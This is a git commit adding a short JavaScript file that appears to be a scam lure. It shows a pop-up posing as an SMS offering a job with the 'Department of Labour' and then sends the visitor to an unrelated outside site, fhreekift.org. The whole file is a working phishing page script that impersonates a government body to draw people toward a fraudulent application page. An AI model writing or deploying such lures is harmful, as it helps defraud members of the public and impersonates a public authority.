aa3d960ec8748ea0e024a85811189d73c33bdd3b
mfednewblog9 <newekpeitid@gmail.com>
2025-11-04 18:24:31 +0100

    Create active-labour.js

---
+++ active-labour.js
@@ -0,0 +1,5 @@
+var password = 'APPLY NOW'
+password=prompt('SMS: Congratulation. You are among the selection ones to work with the Department of Labour, kindly press Ok to submit application ','APPLY NOW');
+if (password != 'APPLY NOW') {
+location.href='https://fhreekift.org/labour.html';
+}
